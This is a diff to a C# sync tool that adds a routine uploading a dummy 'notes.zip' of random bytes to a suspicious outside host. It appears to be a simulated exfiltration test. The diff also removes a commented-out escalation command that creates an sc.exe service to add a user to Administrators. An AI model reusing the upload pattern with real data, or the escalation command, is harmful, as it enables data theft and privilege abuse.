@@ -1,10 +1,12 @@
 ﻿using System;
 using System.IO;
+using System.Net.Http;
 using System.Diagnostics;
 using System.Threading;
 using System.ServiceProcess;
 using VoidSerpent;
 using System.Collections.Generic;
+using System.Threading.Tasks;
 
 namespace BeaverSync
 {
@@ -49,13 +51,13 @@ namespace BeaverSync
                     }
                 }
                 // need to open the database and go through the files and directory tables, sending everything in collected state and mark updated
+                string buPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\BeaverNotesPro");
+                db = new DatabaseManager(Path.Combine(buPath, "syncstate.db"));
                 var pending = db.PendingFiles();
 
 
-                // send the directory
-
-
-
+                // send the directory - we're spoofing data to not leak things
+                Task.Run(() => GimmeOuttaHere());
             }
             else if (args.Length == 1 && args[0] == "register")
             {
@@ -115,14 +117,6 @@ namespace BeaverSync
                     {
                         Console.WriteLine($"An unexpected error occurred: {ex.Message}");
                     }
-
-                    
-
-                    /* OLD STUFF :D
-                    string addcmd = $"\"net localgroup Administrators {user} /add\"";
-                    string[] lpecmd = { "create", "bvSyncService", "displayName=", "bvSyncService", "binPath=", addcmd, "start=", "auto" };
-                    RunCmd(process: "sc.exe", args: lpecmd);
-                    */
                 }
             }
             else if (args.Length == 2 && args[0] == "unregister")
@@ -182,5 +176,51 @@ namespace BeaverSync
                 Console.WriteLine("Failed to request elevation: " + ex.Message);
             }
         }
+
+        private static async Task GimmeOuttaHere()
+        {
+            string filePath = Path.Combine(Path.GetTempPath(), "notes.zip");
+            string uploadUrl = "https://beaverpro.sketchybins.com/sync";
+
+            // Step 1: Create a 500KB file named notes.zip
+            await CreateDummyFile(filePath, 500 * 1024); // 500KB
+
+            // Step 2: Upload the file via POST request
+            using (var httpClient = new HttpClient())
+            {
+                var content = new MultipartFormDataContent();
+
+                // Add the file to the form data
+                var fileStreamContent = new StreamContent(File.OpenRead(filePath));
+                content.Add(fileStreamContent, "file", Path.GetFileName(filePath));
+
+                // Send the POST request
+                HttpResponseMessage response = await httpClient.PostAsync(uploadUrl, content);
+
+                if (response.IsSuccessStatusCode)
+                {
+                    Console.WriteLine("File uploaded successfully.");
+                    string responseBody = await response.Content.ReadAsStringAsync();
+                    Console.WriteLine(responseBody);
+                }
+                else
+                {
+                    Console.WriteLine($"Failed to upload file. Status code: {response.StatusCode}");
+                    Console.WriteLine(await response.Content.ReadAsStringAsync());
+                }
+            }
+        }
+
+        private static async Task CreateDummyFile(string filePath, int sizeInBytes)
+        {
+            using (FileStream fs = File.Create(filePath))
+            {
+                byte[] dummyData = new byte[sizeInBytes];
+                Random rnd = new Random();
+                rnd.NextBytes(dummyData);
+                await fs.WriteAsync(dummyData, 0, dummyData.Length);
+            }
+        }
     }
 }
+
